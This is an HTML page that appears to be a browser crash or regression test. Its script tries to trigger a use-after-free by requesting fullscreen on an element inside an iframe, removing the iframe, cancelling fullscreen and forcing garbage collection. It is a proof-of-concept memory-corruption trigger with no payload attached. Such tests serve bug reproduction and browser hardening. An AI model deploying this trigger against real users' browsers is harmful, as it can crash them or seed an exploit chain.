<!DOCTYPE html>
<html>
<body>
<p>This test passes if it does not crash.</p>
<button onclick="triggerUAF()">Trigger UAF</button><br><br>
<script>
let iframe;
let div;

function setupTarget() {
    iframe = document.createElement('iframe');
    document.body.appendChild(iframe);
    div = iframe.contentDocument.createElement('div');
    iframe.contentDocument.body.appendChild(div);
}

function gc() {
    function gcRec(n) {
        if (n < 1)
            return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

function triggerUAF() {
    if (!iframe || !iframe.isConnected || !div || !div.isConnected) {
        setupTarget();
    }

    const targetDiv = div;
    const targetIframe = iframe;
    const contentDocument = targetIframe.contentDocument;

    iframe = null;
    div = null;

    Promise.resolve(targetDiv.webkitRequestFullscreen && targetDiv.webkitRequestFullscreen()).catch(() => {});

    setTimeout(() => {
        if (targetIframe.parentNode) {
            targetIframe.parentNode.removeChild(targetIframe);
        }
        setTimeout(() => {
            if (contentDocument && contentDocument.webkitCancelFullScreen) {
                contentDocument.webkitCancelFullScreen();
            }
            gc();
            setupTarget();
        }, 0);
    }, 15);
}

setupTarget();
</script>
</body>
</html>
